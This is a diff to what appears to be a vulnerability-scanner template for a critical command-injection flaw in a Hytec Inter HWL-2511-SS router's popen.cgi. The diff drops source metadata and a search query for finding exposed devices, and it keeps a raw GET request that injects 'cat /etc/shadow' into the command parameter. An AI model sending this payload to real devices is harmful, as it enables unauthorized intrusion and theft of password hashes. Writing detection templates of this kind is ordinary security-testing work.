@@ -3,14 +3,8 @@ info:
   name: HytecInterHWL-2511-SS路由器popen.cgi命令注入漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/e46ad0e8ae0821b28a931fc53de5495d
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: e46ad0e8ae0821b28a931fc53de5495d
-    fofa: + hunter`app.name=="PROSCEND(及其他) Celluar Router "`
 http:
 - raw:
   - 'GET /cgi-bin/popen.cgi?command=ping%20-c%201.1.1.1;cat%20/etc/shadow&v=0.130303344313792 HTTP/1.1
